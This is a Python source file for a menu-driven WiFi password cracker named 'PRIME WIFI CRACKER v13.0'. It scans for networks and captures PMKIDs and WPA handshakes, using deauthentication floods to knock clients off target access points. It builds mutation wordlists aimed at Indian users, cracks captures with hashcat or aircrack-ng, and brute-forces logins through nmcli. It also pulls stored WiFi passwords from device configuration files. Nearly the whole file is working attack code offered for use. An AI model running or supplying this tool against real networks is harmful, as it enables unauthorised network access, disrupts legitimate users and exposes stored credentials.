#!/usr/bin/env python3
"""
Wfi_Hack
@Dev
"""
import subprocess
import re
import time
import os
import sys
import json
import shutil
import signal
import hashlib
import threading
import queue
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path


G="\033[92m"; R="\033[91m"; Y="\033[93m"; B="\033[94m"; C="\033[96m"; M="\033[95m"
RESET="\033[0m"; BOLD="\033[1m"


HOME = Path.home() / ".prime"
HOME.mkdir(exist_ok=True)
HS_DIR   = HOME / "handshakes";   HS_DIR.mkdir(exist_ok=True)
PMKID_DIR= HOME / "pmkid";        PMKID_DIR.mkdir(exist_ok=True)
LOG_DIR  = HOME / "logs";         LOG_DIR.mkdir(exist_ok=True)
WL_DIR   = HOME / "wordlists";    WL_DIR.mkdir(exist_ok=True)
STORE    = HOME / "store.json"
CONF     = HOME / "config.json"

# ========== CONFIG ==========
DEFAULT_CFG = {
    "max_threads": 40,
    "deauth_count": 8,
    "capture_timeout": 45,
    "pmkid_timeout": 30,
    "hashcat_bin": "hashcat",
    "aircrack_bin": "aircrack-ng",
    "airodump_bin": "airodump-ng",
    "aireplay_bin": "aireplay-ng",
    "hcxdumptool_bin": "hcxdumptool",
    "hcxpcapngtool_bin": "hcxpcapngtool",
    "interface": None,
    "fallback_iface": "wlan0",
}

def load_cfg():
    if CONF.exists():
        try:
            return {**DEFAULT_CFG, **json.loads(CONF.read_text())}
        except Exception:
            pass
    CONF.write_text(json.dumps(DEFAULT_CFG, indent=2))
    return dict(DEFAULT_CFG)

CFG = load_cfg()

def load_store():
    if STORE.exists():
        try:
            d = json.loads(STORE.read_text())
            return d.get("networks", []), d.get("cracked", {}), d.get("jobs", [])
        except Exception:
            pass
    return [], {}, []

def save_store(networks, cracked, jobs):
    STORE.write_text(json.dumps({
        "networks": networks, "cracked": cracked, "jobs": jobs,
        "updated": datetime.now().isoformat()
    }, indent=2))

NETWORKS, CRACKED, JOBS = load_store()
LOCK = threading.Lock()

# ========== UTIL ==========
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""{R}╔════════════════════════════════════════════════════════════════╗
{R}║{C}  PRIME WIFI CRACKER v13.0 — PMKID | HS | HASHCAT | MUTATION  {R}║
{R}║{Y}  Session: {str(HOME):<52}{R}║
{R}╚════════════════════════════════════════════════════════════════╝{RESET}
""")

def log(msg, tag="info", color=None):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}][{tag}] {msg}"
    with open(LOG_DIR / f"{datetime.now():%Y-%m-%d}.log", "a") as f:
        f.write(line + "\n")
    if color:
        print(f"{color}{line}{RESET}")

def run(cmd, timeout=10, capture=True, check=False):
    try:
        return subprocess.run(cmd, capture_output=capture, text=True,
                              timeout=timeout, check=check)
    except subprocess.TimeoutExpired:
        return None
    except FileNotFoundError:
        return None
    except Exception as e:
        log(f"run err {cmd[:2]}: {e}", "err", R)
        return None

def which(b):
    return shutil.which(b)

def require_root():
    if os.name != "posix":
        return True
    if os.geteuid() != 0:
        print(f"{R}[!] Root required for monitor mode / deauth / PMKID capture{RESET}")
        print(f"{Y}    Re-run with: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)
    return True

def have(tool):
    p = which(tool)
    if not p:
        print(f"{Y}[!] missing tool: {tool}{RESET}")
    return p

KILL_LIST = ["NetworkManager", "wpa_supplicant", "avahi-daemon"]

def list_ifaces():
    r = run(["iw", "dev"])
    if not r: return []
    return re.findall(r"Interface (\S+)", r.stdout)

def get_phy(iface):
    r = run(["iw", "dev", iface, "info"])
    if not r: return None
    m = re.search(r"wiphy (\d+)", r.stdout)
    return m.group(1) if m else None

def kill_interferers():
    killed = []
    for proc in KILL_LIST:
        r = run(["pkill", "-f", proc])
        if r is not None:
            killed.append(proc)
    time.sleep(1)
    return killed

def restart_interferers():
    for svc in ["NetworkManager", "wpa_supplicant"]:
        run(["systemctl", "start", svc], timeout=5)

def enable_monitor(iface):
    if which("airmon-ng"):
        run(["airmon-ng", "check", "kill"], timeout=10)
        r = run(["airmon-ng", "start", iface], timeout=15)
        if r:
            m = re.search(r"monitor mode (?:enabled|vif enabled) on (\S+)", r.stdout, re.I)
            if m: return m.group(1)
            m2 = re.search(r"\(monitor mode enabled on (\S+)\)", r.stdout)
            if m2: return m2.group(1)
    phy = get_phy(iface)
    if not phy:
        return None
    mon = f"{iface}mon"
    run(["ip", "link", "set", iface, "down"])
    run(["iw", "dev", iface, "interface", "add", mon, "type", "monitor"])
    run(["ip", "link", "set", mon, "up"])
    r = run(["iw", "dev", mon, "info"])
    if r and "monitor" in r.stdout:
        return mon
    return None

def disable_monitor(mon):
    if which("airmon-ng") and mon.endswith("mon"):
        run(["airmon-ng", "stop", mon], timeout=15)
    else:
        run(["ip", "link", "set", mon, "down"])
        run(["iw", "dev", mon, "del"])
    restart_interferers()

def pick_iface():
    if CFG.get("interface") and CFG["interface"] in list_ifaces():
        return CFG["interface"]
    ifaces = [i for i in list_ifaces() if not i.endswith("mon")]
    if not ifaces:
        return CFG.get("fallback_iface")
    return ifaces[0]

# ========== SCAN ==========
def scan_networks(iface=None, duration=12):
    iface = iface or pick_iface()
    log(f"scanning on {iface} for {duration}s", "scan", B)

    out = {}
    r = run(["iw", "dev", iface, "scan"], timeout=duration + 5)
    if r and r.stdout:
        cur = None
        for line in r.stdout.splitlines():
            m = re.match(r"BSS ([0-9a-f:]{17})", line)
            if m:
                cur = {"bssid": m.group(1).upper(), "ssid": None,
                       "signal": None, "channel": None, "privacy": None}
                out[cur["bssid"]] = cur
                continue
            if cur is None: continue
            s = line.strip()
            if s.startswith("SSID:"):
                cur["ssid"] = s.split(":", 1)[1].strip()
            elif s.startswith("signal:"):
                mm = re.search(r"(-?\d+)", s)
                if mm: cur["signal"] = int(mm.group(1))
            elif s.startswith("DS Parameter set: channel"):
                mm = re.search(r"(\d+)", s)
                if mm: cur["channel"] = int(mm.group(1))
            elif s.startswith("capability:") or "Privacy" in s:
                cur["privacy"] = "WPA" in s or "Privacy" in s

    r2 = run(["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list"],
             timeout=duration)
    if r2 and r2.stdout:
        for line in r2.stdout.splitlines():
            parts = re.split(r"(?<!\\):", line)
            if len(parts) < 5: continue
            ssid, bssid, chan, sig, sec = parts[0], parts[1].replace("\\", ""), parts[2], parts[3], parts[4]
            key = bssid.upper() if bssid else f"ssid:{ssid}"
            if key not in out:
                out[key] = {"bssid": bssid or "Unknown", "ssid": ssid,
                            "signal": int(sig) if sig.isdigit() else None,
                            "channel": int(chan) if chan.isdigit() else None,
                            "privacy": "WPA" in sec.upper()}

    nets = [n for n in out.values() if n.get("ssid")]
    for n in nets:
        n["score"] = (n.get("signal") or -100) + 100
    nets.sort(key=lambda x: -x["score"])
    return nets

def capture_pmkid(iface, bssid, timeout=None):
    timeout = timeout or CFG["pmkid_timeout"]
    if not have("hcxdumptool"):
        return None
    mon = enable_monitor(iface)
    if not mon:
        log("monitor mode failed", "pmkid", R)
        return None
    try:
        out = PMKID_DIR / f"{bssid.replace(':','')}_{int(time.time())}.pcapng"
        cmd = ["hcxdumptool", "-i", mon, "-o", str(out),
               f"--filterlist_ap={bssid}", "--filtermode=2",
               "-t", "5", "--enable_status=1"]
        log(f"PMKID capture → {out.name}", "pmkid", C)
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        t0 = time.time()
        while time.time() - t0 < timeout:
            if out.exists() and out.stat().st_size > 200:
                time.sleep(2)
                break
            time.sleep(1)
        proc.send_signal(signal.SIGINT)
        try: proc.wait(timeout=5)
        except: proc.kill()
        return str(out) if out.exists() else None
    finally:
        disable_monitor(mon)

def pmkid_to_hash(pcapng_path):
    if not have("hcxpcapngtool"):
        return None
    hc = PMKID_DIR / (Path(pcapng_path).stem + ".22000")
    r = run(["hcxpcapngtool", "-o", str(hc), pcapng_path], timeout=30)
    if hc.exists() and hc.stat().st_size > 0:
        return str(hc)
    return None

def capture_handshake(iface, bssid, channel, ssid, timeout=None):
    timeout = timeout or CFG["capture_timeout"]
    for tool in ["airodump-ng", "aireplay-ng"]:
        if not have(tool): return None
    mon = enable_monitor(iface)
    if not mon: return None
    try:
        prefix = HS_DIR / f"hs_{bssid.replace(':','')}_{int(time.time())}"
        log(f"airodump on ch{channel} → {prefix.name}", "hs", C)
        airo = subprocess.Popen(
            ["airodump-ng", "-c", str(channel), "--bssid", bssid,
             "-w", str(prefix), mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(5)
        log("deauth burst", "hs", Y)
        for _ in range(3):
            subprocess.run(["aireplay-ng", "--deauth", str(CFG["deauth_count"]),
                            "-a", bssid, mon],
                           capture_output=True, timeout=15)
            time.sleep(3)
            cap = Path(str(prefix) + "-01.cap")
            if cap.exists():
                r = run(["aircrack-ng", str(cap)], timeout=5)
                if r and re.search(r"\d+ handshake", r.stdout):
                    log("handshake captured", "hs", G)
                    break
        t0 = time.time()
        cap = Path(str(prefix) + "-01.cap")
        while time.time() - t0 < timeout:
            if cap.exists():
                r = run(["aircrack-ng", str(cap)], timeout=5)
                if r and re.search(r"WPA \(1 handshake\)", r.stdout):
                    break
            time.sleep(2)
        airo.send_signal(signal.SIGINT)
        try: airo.wait(timeout=5)
        except: airo.kill()
        return str(cap) if cap.exists() else None
    finally:
        disable_monitor(mon)

def cap_to_hash(cap_path):
    if which("hcxpcapngtool"):
        hc = HS_DIR / (Path(cap_path).stem + ".22000")
        r = run(["hcxpcapngtool", "-o", str(hc), cap_path], timeout=30)
        if hc.exists() and hc.stat().st_size > 0:
            return str(hc)
    if which("cap2hccapx"):
        hcx = HS_DIR / (Path(cap_path).stem + ".hccapx")
        run(["cap2hccapx", cap_path, str(hcx)], timeout=30)
        if hcx.exists() and hcx.stat().st_size > 0:
            return str(hcx)
    return None

# ========== WORDLIST GENERATION + MUTATION ==========
BASE_WORDS = set()

def _load_base():
    global BASE_WORDS
    if BASE_WORDS: return
    for d in range(10):
        for n in (4,6,8,10,12):
            BASE_WORDS.add(str(d)*n)
    BASE_WORDS.update(["01234567","12345678","23456789","34567890",
                       "012345678","123456789","0123456789","1234567890",
                       "87654321","76543210","98765432","987654321","9876543210"])
    BASE_WORDS.update([
        "12345678","password","123456789","qwerty","admin","letmein",
        "welcome","12345","00000000","1234567890","qwerty123","password123",
        "admin123","letmein123","welcome123","123123","abc123","passw0rd",
        "password1","wifi","wlan","internet","network","router","default",
        "root","user","guest","changeme","2023","2024","2025","2026",
        "qwertyuiop","asdfghjkl","zxcvbnm","1q2w3e4r","1qaz2wsx",
        "iloveyou","sunshine","monkey","dragon","master","superman",
        "batman","spiderman","pokemon","android","iphone","samsung",
        "google","facebook","instagram","tiktok","youtube","netflix",
    ])
    cities = ["mumbai","delhi","kolkata","chennai","bangalore","hyderabad",
              "pune","ahmedabad","jaipur","lucknow","kanpur","nagpur",
              "indore","bhopal","patna","noida","agra","varanasi","goa"]
    for c in cities:
        BASE_WORDS.add(c); BASE_WORDS.add(c+"123"); BASE_WORDS.add(c+"2024")
    hindi = ["namaste","jaihind","vande","ganpati","ganesh","shiva","vishnu",
             "rama","krishna","durga","kali","bharat","hindustan","india"]
    for w in hindi:
        BASE_WORDS.add(w); BASE_WORDS.add(w+"123")
    names = ["amit","raj","rahul","sanjay","vijay","ankit","deepak","suresh",
             "ramesh","naveen","pradeep","vivek","arun","manish","ravi",
             "rohit","sachin","sandeep","shivam","sonu","sunil","tarun",
             "varun","abhishek","akash","anil","arvind","ashish","bharat",
             "chetan","ganesh","krishna","kunal","manoj","mayank","nikhil",
             "priya","anjali","poonam","neha","kavita","sunita","sarita",
             "ritu","sneha","pallavi","monika","jyoti","geeta","seema",
             "radha","sita","nisha","rekha","usha","vandana","meena",
             "pooja","sakshi","shilpa"]
    for n in names:
        BASE_WORDS.add(n); BASE_WORDS.add(n+"123"); BASE_WORDS.add(n+"1234")
        BASE_WORDS.add(n+"2024"); BASE_WORDS.add(n.capitalize())
        BASE_WORDS.add(n.capitalize()+"123")
    BASE_WORDS.update(["cricket","sachin","tendulkar","dhoni","virat","kohli",
                       "diwali","holi","dussehra","bollywood","srk"])

def _ssid_variants(ssid):
    if not ssid: return set()
    s = ssid.strip()
    c = s.replace(" ", "")
    out = set()
    for base in {s, c, s.lower(), c.lower(), s.upper(), c.upper()}:
        for suf in ["", "123","1234","12345","!","@","#","2024","2025","2026",
                    "admin","password","wifi","@123","@2024","_123"]:
            out.add(base+suf)
    return out

def mutate(word):
    out = {word}
    out.add(word.capitalize())
    out.add(word.upper())
    leet = word.replace("a","@").replace("e","3").replace("i","1").replace("o","0").replace("s","5")
    if leet != word: out.add(leet)
    for suf in ["1","12","123","1234","12345","!","@","#","1!","@123","2024","2025"]:
        out.add(word+suf)
    for p in ["1","12","123"]:
        out.add(p+word)
    return out

def generate_wordlist(ssid=None, limit=None, use_mutation=True, base_only=False):
    _load_base()
    words = set()
    if not base_only:
        words.update(BASE_WORDS)
        for i in range(10000):
            words.add(f"{i:04d}")
    if ssid:
        words.update(_ssid_variants(ssid))
    if use_mutation:
        seeded = list(words)[:5000]
        for w in seeded:
            words.update(mutate(w))
    out = list(words)
    if limit:
        out = out[:limit]
    return out

def write_wordlist(name, words):
    p = WL_DIR / name
    with open(p, "w") as f:
        f.write("\n".join(words))
    return str(p)

# ========== HASHCAT / AIRCRACK PIPELINE ==========
def crack_hash_with_hashcat(hash_file, wordlist):
    hc = which(CFG["hashcat_bin"])
    if not hc:
        return None
    mode = "22000" if hash_file.endswith(".22000") else "16800"
    log(f"hashcat -m {mode} {Path(hash_file).name}", "hashcat", C)
    cmd = [hc, "-m", mode, "-a", "0", hash_file, wordlist,
           "--potfile-path", str(HOME / "hashcat.potfile"),
           "--status", "--status-timer=5", "--quiet",
           "-o", str(HOME / "hashcat.out")]
    proc = subprocess.Popen(cmd)
    proc.wait()
    out = HOME / "hashcat.out"
    if out.exists() and out.stat().st_size > 0:
        line = out.read_text().strip().splitlines()[-1]
        parts = line.split(":")
        return parts[-1] if parts else None
    return None

def crack_cap_with_aircrack(cap_file, wordlist):
    ac = which(CFG["aircrack_bin"])
    if not ac: return None
    log(f"aircrack-ng {Path(cap_file).name}", "aircrack", C)
    r = run([ac, "-w", wordlist, "-b", "", cap_file], timeout=1800)
    if r and "KEY FOUND" in r.stdout:
        m = re.search(r"KEY FOUND!\s*\[\s*(\S+)\s*\]", r.stdout)
        if m: return m.group(1)
    return None

# ========== SOFTWARE-TEST PATH ==========
def try_connect_nmcli(ssid, password):
    r = run(["nmcli", "--wait", "5", "dev", "wifi", "connect", ssid, "password", password], timeout=8)
    if r and ("successfully" in r.stdout.lower() or "activated" in r.stdout.lower()):
        return True
    return False

def test_queue_worker(ssid, q, found_flag):
    while not found_flag["stop"]:
        try:
            pwd = q.get(timeout=1)
        except queue.Empty:
            return
        if pwd is None:
            q.task_done()
            return
        if try_connect_nmcli(ssid, pwd):
            found_flag["password"] = pwd
            found_flag["stop"] = True
        q.task_done()

def crack_ssid_by_try(ssid, words):
    q = queue.Queue()
    found_flag = {"stop": False, "password": None}
    threads = []
    for _ in range(CFG["max_threads"]):
        t = threading.Thread(target=test_queue_worker, args=(ssid, q, found_flag), daemon=True)
        t.start(); threads.append(t)
    for w in words:
        if found_flag["stop"]: break
        q.put(w)
    for _ in threads: q.put(None)
    for t in threads: t.join(timeout=2)
    return found_flag["password"]

# ========== SAVED PASSWORDS ==========
def get_saved_passwords():
    out = []
    for path in ["/data/misc/wifi/wpa_supplicant.conf",
                 "/data/vendor/wifi/wpa/wpa_supplicant.conf",
                 "/etc/wifi/wpa_supplicant.conf"]:
        if os.path.exists(path):
            try:
                content = open(path, errors="ignore").read()
                for net in re.findall(r"network=\{([^}]*)\}", content, re.DOTALL):
                    sm = re.search(r'ssid="([^"]+)"', net)
                    pm = re.search(r'psk="?([^"\n]+)"?', net)
                    if sm and pm:
                        out.append({"ssid": sm.group(1), "password": pm.group(1)})
            except Exception:
                pass
    return out

# ========== TARGET MANAGEMENT ==========
def add_network(ssid, bssid="", channel=None, security="WPA2"):
    if not ssid: return False
    if any(n["ssid"] == ssid for n in NETWORKS): return False
    NETWORKS.append({
        "ssid": ssid, "bssid": bssid or "Unknown",
        "channel": channel, "security": security,
        "added": datetime.now().isoformat(), "status": "pending"
    })
    save_store(NETWORKS, CRACKED, JOBS)
    return True

def remove_network(ssid):
    global NETWORKS
    NETWORKS = [n for n in NETWORKS if n["ssid"] != ssid]
    save_store(NETWORKS, CRACKED, JOBS)

def mark_cracked(ssid, password, method):
    CRACKED[ssid] = password
    for n in NETWORKS:
        if n["ssid"] == ssid:
            n["status"] = "cracked"
    JOBS.append({"ssid": ssid, "password": password, "method": method,
                 "ts": datetime.now().isoformat()})
    save_store(NETWORKS, CRACKED, JOBS)

# ========== HIGH-LEVEL ACTIONS ==========
def action_pmkid(ssid, bssid, iface=None):
    iface = iface or pick_iface()
    pcapng = capture_pmkid(iface, bssid)
    if not pcapng:
        return None
    hc = pmkid_to_hash(pcapng)
    if not hc:
        log("no PMKID hash produced", "pmkid", R)
        return None
    log(f"PMKID hash: {Path(hc).name}", "pmkid", G)
    wl = write_wordlist(f"wl_{ssid.replace(' ','_')}.txt",
                        generate_wordlist(ssid, limit=200_000))
    pwd = crack_hash_with_hashcat(hc, wl)
    if pwd:
        mark_cracked(ssid, pwd, "pmkid+hashcat")
    return pwd

def action_handshake(ssid, bssid, channel, iface=None):
    iface = iface or pick_iface()
    cap = capture_handshake(iface, bssid, channel, ssid)
    if not cap:
        return None
    hc = cap_to_hash(cap)
    if hc:
        wl = write_wordlist(f"wl_{ssid.replace(' ','_')}.txt",
                            generate_wordlist(ssid, limit=200_000))
        pwd = crack_hash_with_hashcat(hc, wl)
    else:
        wl = write_wordlist(f"wl_{ssid.replace(' ','_')}.txt",
                            generate_wordlist(ssid, limit=200_000))
        pwd = crack_cap_with_aircrack(cap, wl)
    if pwd:
        mark_cracked(ssid, pwd, "handshake")
    return pwd

def action_try(ssid):
    words = generate_wordlist(ssid)
    log(f"software-try {len(words):,} candidates on {ssid}", "try", B)
    pwd = crack_ssid_by_try(ssid, words)
    if pwd:
        mark_cracked(ssid, pwd, "try")
    return pwd

# ========== MENU ==========
def menu():
    while True:
        print("\n" + "=" * 66)
        print(f"{C}[1]{RESET} Scan networks")
        print(f"{C}[2]{RESET} Add target manually")
        print(f"{C}[3]{RESET} List targets")
        print(f"{C}[4]{RESET} PMKID attack (clientless, fastest)")
        print(f"{C}[5]{RESET} Handshake capture (deauth + crack)")
        print(f"{C}[6]{RESET} Software try (nmcli wordlist)")
        print(f"{C}[7]{RESET} Crack all pending (auto: PMKID → HS → try)")
        print(f"{C}[8]{RESET} Show cracked")
        print(f"{C}[9]{RESET} Saved passwords on device")
        print(f"{C}[10]{RESET} Remove target")
        print(f"{C}[11]{RESET} Build wordlist for SSID")
        print(f"{C}[12]{RESET} Show config")
        print(f"{C}[0]{RESET} Exit")
        print("=" * 66)
        try:
            c = input(f"{B}[PRIME]{RESET} > ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if c == "0":
            break
        elif c == "1":
            nets = scan_networks()
            if not nets:
                print(f"{Y}no networks — check iface / monitor mode{RESET}")
            for i, n in enumerate(nets, 1):
                sig = n.get("signal") or 0
                ssid = n.get("ssid") or "<hidden>"
                print(f"  {C}{i:>3}{RESET}. {BOLD}{ssid:<28}{RESET} "
                      f"{n.get('bssid','')} ch={n.get('channel')} sig={sig}dBm")
        elif c == "2":
            ssid = input("SSID: ").strip()
            if ssid:
                bssid = input("BSSID (blank ok): ").strip()
                ch = input("Channel (blank ok): ").strip()
                add_network(ssid, bssid, int(ch) if ch.isdigit() else None)
                print(f"{G}added{RESET}")
        elif c == "3":
            if not NETWORKS:
                print(f"{Y}no targets{RESET}")
            for i, n in enumerate(NETWORKS, 1):
                st = f"{G}✓{RESET}" if n["status"] == "cracked" else f"{Y}○{RESET}"
                print(f"  {i}. {st} {n['ssid']} {n.get('bssid','')} "
                      f"ch={n.get('channel')}")
                if n["status"] == "cracked":
                    print(f"     → {CRACKED.get(n['ssid'])}")
        elif c in {"4","5","6","7"}:
            if not NETWORKS:
                print(f"{Y}add or scan first{RESET}"); continue
            if c == "4":
                for n in NETWORKS:
                    if n["status"] == "cracked": continue
                    if n.get("bssid","Unknown") == "Unknown":
                        print(f"{Y}{n['ssid']}: need BSSID — scan first{RESET}"); continue
                    p = action_pmkid(n["ssid"], n["bssid"])
                    print(f"{G}✓ {n['ssid']} → {p}{RESET}" if p
                          else f"{R}✗ {n['ssid']}{RESET}")
            elif c == "5":
                for n in NETWORKS:
                    if n["status"] == "cracked": continue
                    if n.get("bssid","Unknown") == "Unknown" or not n.get("channel"):
                        print(f"{Y}{n['ssid']}: need BSSID+ch — scan first{RESET}"); continue
                    p = action_handshake(n["ssid"], n["bssid"], n["channel"])
                    print(f"{G}✓ {n['ssid']} → {p}{RESET}" if p
                          else f"{R}✗ {n['ssid']}{RESET}")
            elif c == "6":
                for n in NETWORKS:
                    if n["status"] == "cracked": continue
                    p = action_try(n["ssid"])
                    print(f"{G}✓ {n['ssid']} → {p}{RESET}" if p
                          else f"{R}✗ {n['ssid']}{RESET}")
            elif c == "7":
                for n in NETWORKS:
                    if n["status"] == "cracked": continue
                    p = None
                    if n.get("bssid","Unknown") != "Unknown":
                        p = action_pmkid(n["ssid"], n["bssid"])
                    if not p and n.get("channel") and n.get("bssid","Unknown") != "Unknown":
                        p = action_handshake(n["ssid"], n["bssid"], n["channel"])
                    if not p:
                        p = action_try(n["ssid"])
                    print(f"{G}✓ {n['ssid']} → {p}{RESET}" if p
                          else f"{R}✗ {n['ssid']}{RESET}")
        elif c == "8":
            if not CRACKED:
                print(f"{Y}none yet{RESET}")
            for ssid, pwd in CRACKED.items():
                print(f"  {BOLD}{ssid}{RESET} : {G}{pwd}{RESET}")
        elif c == "9":
            for s in get_saved_passwords():
                print(f"  {s['ssid']} : {s['password']}")
        elif c == "10":
            for i, n in enumerate(NETWORKS, 1):
                print(f"  {i}. {n['ssid']}")
            try:
                i = int(input("remove #: ")) - 1
                if 0 <= i < len(NETWORKS):
                    remove_network(NETWORKS[i]["ssid"])
                    print(f"{G}removed{RESET}")
            except Exception:
                pass
        elif c == "11":
            ssid = input("SSID: ").strip()
            limit = input("limit (default 500000): ").strip()
            lim = int(limit) if limit.isdigit() else 500_000
            words = generate_wordlist(ssid, limit=lim)
            p = write_wordlist(f"wl_{ssid.replace(' ','_')}.txt", words)
            print(f"{G}{len(words):,} words → {p}{RESET}")
        elif c == "12":
            print(json.dumps(CFG, indent=2))
        else:
            print(f"{R}invalid{RESET}")

# ========== ENTRY ==========
def parse_args():
    ap = argparse.ArgumentParser(description="PRIME WIFI CRACKER v13.0")
    ap.add_argument("--no-root-check", action="store_true")
    ap.add_argument("--iface", help="wireless interface")
    ap.add_argument("--ssid", help="target SSID (for automation)")
    ap.add_argument("--bssid", help="target BSSID")
    ap.add_argument("--channel", type=int)
    ap.add_argument("--method", choices=["pmkid","hs","try","all"], default=None)
    ap.add_argument("--build-wordlist", metavar="SSID",
                    help="build wordlist for SSID and exit")
    ap.add_argument("--limit", type=int, default=500_000)
    return ap.parse_args()

def main():
    args = parse_args()
    if args.iface:
        CFG["interface"] = args.iface
    if not args.no_root_check:
        if args.method in {"pmkid","hs","all"} and hasattr(os, "geteuid") and os.geteuid() != 0:
            require_root()

    banner()

    if args.build_wordlist:
        w = generate_wordlist(args.build_wordlist, limit=args.limit)
        p = write_wordlist(f"wl_{args.build_wordlist.replace(' ','_')}.txt", w)
        print(f"{G}{len(w):,} words → {p}{RESET}")
        return

    if args.method and args.ssid:
        if args.method in {"pmkid","all"}:
            p = action_pmkid(args.ssid, args.bssid)
            if p: print(f"{G}PMKID → {p}{RESET}"); return
        if args.method in {"hs","all"} and args.channel:
            p = action_handshake(args.ssid, args.bssid, args.channel)
            if p: print(f"{G}HS → {p}{RESET}"); return
        if args.method in {"try","all"}:
            p = action_try(args.ssid)
            if p: print(f"{G}TRY → {p}{RESET}"); return
        print(f"{R}not cracked{RESET}")
        return

    menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}interrupted{RESET}")
    except Exception as e:
        print(f"{R}fatal: {e}{RESET}")
        raise